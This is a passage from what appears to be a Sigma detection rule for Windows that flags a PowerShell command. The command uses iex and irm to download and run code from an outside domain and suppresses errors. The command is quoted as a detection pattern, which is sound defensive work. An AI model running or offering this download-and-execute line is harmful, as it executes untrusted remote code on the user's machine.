  product: windows
detection:
  selection:
    CommandLine|contains: powershell "Write-Host(&{iex(irm('elxxvvx.xyz/f'))})2>$null"
  condition: selection
falsepositives:
- Legitimate PowerShell scripting using iex and irm for remote configuration or updates
- Administrative automation scripts downloading content from internal or trusted external sources
level: high
